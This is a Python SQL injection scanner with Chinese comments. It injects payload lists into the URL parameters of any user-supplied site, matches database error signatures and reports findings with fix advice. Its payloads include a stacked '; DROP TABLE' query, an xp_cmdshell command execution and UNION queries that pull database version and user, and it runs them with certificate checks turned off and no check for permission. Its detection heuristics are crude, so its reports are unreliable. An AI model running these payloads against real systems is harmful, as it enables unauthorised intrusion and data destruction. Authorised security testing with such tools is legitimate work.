import requests
import re
from urllib.parse import urljoin, quote
import time
import json
from typing import Dict, List, Tuple
from dataclasses import dataclass
from enum import Enum

class VulnType(Enum):
    ERROR_BASED = "错误注入"
    UNION_BASED = "联合查询注入"
    BOOLEAN_BASED = "布尔注入"
    TIME_BASED = "时间盲注"
    STACK_QUERY = "堆叠查询注入"
    BLIND = "盲注"

@dataclass
class VulnResult:
    type: VulnType
    parameter: str
    payload: str
    description: str
    poc: str
    risk_level: str
    details: Dict
    recommendations: List[str]

class SQLInjectionScanner:
    def __init__(self):
        self._load_payloads()
        self._load_patterns()
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        self.timeout = 10
        self.delay = 0.5

    def _load_payloads(self):
        # 分类存储不同类型的payload
        self.payloads = {
            VulnType.ERROR_BASED: [
                "'''", 
                "'))", 
                "\"\"\"",
                "%%",
                "--", 
                "#",
                "/*!12345SELECT*/",
            ],
            VulnType.UNION_BASED: [
                " UNION ALL SELECT NULL--",
                " UNION ALL SELECT NULL,NULL--",
                " UNION ALL SELECT NULL,NULL,NULL--",
                ") UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT version(),user(),database()--",
            ],
            VulnType.BOOLEAN_BASED: [
                "' AND '1'='1",
                "' AND '1'='2",
                "' OR '1'='1",
                "1' AND sleep(0)='0",
                "1' AND 1=1--",
            ],
            VulnType.TIME_BASED: [
                "'; WAITFOR DELAY '0:0:5'--",
                "'); WAITFOR DELAY '0:0:5'--",
                "' OR sleep(5)--",
                "' AND sleep(5)--",
                "BENCHMARK(5000000,MD5(1))",
            ],
            VulnType.STACK_QUERY: [
                "; DROP TABLE temp--",
                "; SELECT @@version--",
                "; EXEC xp_cmdshell 'ping 127.0.0.1'--",
            ]
        }

    def _load_patterns(self):
        self.error_patterns = {
            'mysql': [
                r"SQL syntax.*?MySQL",
                r"Warning.*?\Wmysqli?_",
                r"MySQLSyntaxErrorException",
                r"valid MySQL result",
                r"check the manual that (corresponds to|fits) your MySQL server version",
            ],
            'postgresql': [
                r"PostgreSQL.*?ERROR",
                r"Warning.*?\Wpg_",
                r"valid PostgreSQL result",
                r"Npgsql\.",
            ],
            'mssql': [
                r"Driver.*? SQL[\-\_\ ]*Server",
                r"OLE DB.*? SQL Server",
                r"\bSQL Server[^&lt;&quot;]+Driver",
                r"Warning.*?\W(mssql|sqlsrv)_",
                r"\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}",
            ],
            'oracle': [
                r"\bORA-[0-9][0-9][0-9][0-9]",
                r"Oracle error",
                r"Oracle.*?Driver",
                r"Warning.*?\W(oci|ora)_",
            ],
            'sqlite': [
                r"SQLite/JDBCDriver",
                r"SQLite\.Exception",
                r"System\.Data\.SQLite\.SQLiteException",
                r"Warning.*?\Wsqlite_",
            ]
        }

    def scan_url(self, url: str) -> List[VulnResult]:
        print(f"\n[*] 开始扫描: {url}")
        results = []
        
        try:
            # 基础信息收集
            base_response = self._send_request(url)
            base_length = len(base_response.text) if base_response else 0
            
            # 获取参数列表
            params = self._get_parameters(url)
            if not params:
                params = ['id', 'page', 'user', 'username', 'search']
            
            # 测试每个参数
            for param in params:
                param_results = self._test_parameter(url, param, base_length)
                results.extend(param_results)
                
        except Exception as e:
            print(f"[!] 扫描过程中出错: {str(e)}")
            
        return self._analyze_results(results)

    def _test_parameter(self, url: str, param: str, base_length: int) -> List[VulnResult]:
        results = []
        print(f"[+] 测试参数: {param}")

        for vuln_type, payloads in self.payloads.items():
            for payload in payloads:
                try:
                    test_url = self._inject_payload(url, param, payload)
                    start_time = time.time()
                    response = self._send_request(test_url)
                    response_time = time.time() - start_time
                    
                    if not response:
                        continue

                    result = self._check_vulnerability(
                        vuln_type,
                        param,
                        payload,
                        response,
                        base_length,
                        response_time
                    )
                    
                    if result:
                        results.append(result)
                        
                except Exception as e:
                    print(f"[!] 测试payload时出错: {str(e)}")
                    continue
                
                time.sleep(self.delay)
        
        return results

    def _check_vulnerability(
        self, 
        vuln_type: VulnType,
        param: str,
        payload: str,
        response,
        base_length: int,
        response_time: float
    ) -> VulnResult:
        
        # 检测基于错误的注入
        if vuln_type == VulnType.ERROR_BASED:
            for dbms, patterns in self.error_patterns.items():
                for pattern in patterns:
                    if re.search(pattern, response.text, re.I):
                        return VulnResult(
                            type=vuln_type,
                            parameter=param,
                            payload=payload,
                            description=f"发现{dbms}数据库错误信息泄露",
                            poc=f"{param}={payload}",
                            risk_level="高",
                            details={
                                "数据库类型": dbms,
                                "错误信息": re.search(pattern, response.text, re.I).group(0)
                            },
                            recommendations=[
                                "1. 关闭生产环境的错误显示",
                                "2. 使用参数化查询",
                                "3. 实施输入验证和转义"
                            ]
                        )

        # 检测基于时间的注入
        if vuln_type == VulnType.TIME_BASED and response_time > 5:
            return VulnResult(
                type=vuln_type,
                parameter=param,
                payload=payload,
                description="发现基于时间的SQL注入漏洞",
                poc=f"{param}={payload}",
                risk_level="中",
                details={
                    "响应时间": f"{response_time:.2f}秒"
                },
                recommendations=[
                    "1. 使用参数化查询",
                    "2. 限制SQL语句执行时间",
                    "3. 实施WAF防护"
                ]
            )

        # 检测基于联合查询的注入
        if vuln_type == VulnType.UNION_BASED:
            if len(response.text) > base_length * 2 or 'UNION' in response.text:
                return VulnResult(
                    type=vuln_type,
                    parameter=param,
                    payload=payload,
                    description="发现基于UNION的SQL注入漏洞",
                    poc=f"{param}={payload}",
                    risk_level="高",
                    details={
                        "响应长度": len(response.text),
                        "基准长度": base_length
                    },
                    recommendations=[
                        "1. 使用ORM或参数化查询",
                        "2. 实施输入验证",
                        "3. 最小权限原则配置数据库账号"
                    ]
                )

        # 检测布尔注入
        if vuln_type == VulnType.BOOLEAN_BASED:
            true_payload = payload.replace("'1'='2", "'1'='1")
            false_payload = payload.replace("'1'='1", "'1'='2")
            
            true_response = self._send_request(self._inject_payload(response.url, param, true_payload))
            false_response = self._send_request(self._inject_payload(response.url, param, false_payload))
            
            if true_response and false_response and \
               abs(len(true_response.text) - len(false_response.text)) > 100:
                return VulnResult(
                    type=vuln_type,
                    parameter=param,
                    payload=payload,
                    description="发现基于布尔的SQL注入漏洞",
                    poc=f"{param}={payload}",
                    risk_level="中",
                    details={
                        "TRUE响应长度": len(true_response.text),
                        "FALSE响应长度": len(false_response.text)
                    },
                    recommendations=[
                        "1. 使用参数化查询",
                        "2. 实施输入验证",
                        "3. 统一错误响应"
                    ]
                )

        return None

    def _send_request(self, url: str) -> requests.Response:
        try:
            return requests.get(
                url,
                headers=self.headers,
                timeout=self.timeout,
                verify=False
            )
        except:
            return None

    def _get_parameters(self, url: str) -> List[str]:
        params = []
        if '?' in url:
            query = url.split('?')[1]
            for param in query.split('&'):
                if '=' in param:
                    params.append(param.split('=')[0])
        return params

    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        encoded_payload = quote(payload)
        if '?' not in url:
            return f"{url}?{param}={encoded_payload}"
        
        base_url = url.split('?')[0]
        query = url.split('?')[1]
        new_params = []
        param_found = False
        
        for p in query.split('&'):
            if p.startswith(f"{param}="):
                new_params.append(f"{param}={encoded_payload}")
                param_found = True
            else:
                new_params.append(p)
        
        if not param_found:
            new_params.append(f"{param}={encoded_payload}")
        
        return f"{base_url}?{'&'.join(new_params)}"

    def _analyze_results(self, results: List[VulnResult]) -> List[VulnResult]:
        # 去重和结果分析
        unique_results = {}
        for result in results:
            key = f"{result.type}_{result.parameter}"
            if key not in unique_results:
                unique_results[key] = result
            
        return list(unique_results.values())

def main():
    scanner = SQLInjectionScanner()
    url = input("请输入要扫描的URL: ")
    
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    results = scanner.scan_url(url)
    
    if results:
        print("\n[!] 扫描报告")
        print("=" * 50)
        
        for i, result in enumerate(results, 1):
            print(f"\n漏洞 #{i}")
            print(f"类型: {result.type.value}")
            print(f"参数: {result.parameter}")
            print(f"描述: {result.description}")
            print(f"风险等级: {result.risk_level}")
            print(f"POC: {result.poc}")
            print("\n详细信息:")
            for k, v in result.details.items():
                print(f"  {k}: {v}")
            print("\n修复建议:")
            for rec in result.recommendations:
                print(f"  {rec}")
            print("-" * 50)
    else:
        print("\n[+] 未发现明显的SQL注入漏洞")

if __name__ == "__main__":
    main()